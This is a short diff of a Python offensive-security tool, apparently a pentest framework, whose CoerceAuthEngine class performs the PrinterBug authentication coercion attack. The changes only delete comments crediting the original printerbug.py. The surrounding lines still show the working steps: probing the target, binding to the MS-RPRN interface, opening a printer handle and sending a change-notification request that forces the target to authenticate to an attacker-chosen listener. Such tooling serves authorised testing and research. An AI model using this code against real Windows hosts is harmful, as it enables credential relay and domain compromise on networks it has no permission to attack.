@@ -425,7 +425,6 @@ class CoerceAuthEngine:
         """
         print_status(f"Starting PrinterBug coercion: {target_ip} -> {listener_ip}", "info")
 
-        # TCP Ping check (from original printerbug.py)
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
@@ -455,7 +454,6 @@ class CoerceAuthEngine:
             dce.bind(rprn.MSRPC_UUID_RPRN)
             print_status("Bind OK", "good")
 
-            # Open printer handle (from original printerbug.py)
             try:
                 resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % target_ip)
             except Exception as e:
@@ -468,7 +466,6 @@ class CoerceAuthEngine:
 
             print_status("Got handle", "good")
 
-            # Send notification request (from original printerbug.py)
             request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
             request['hPrinter'] = resp['pHandle']
             request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
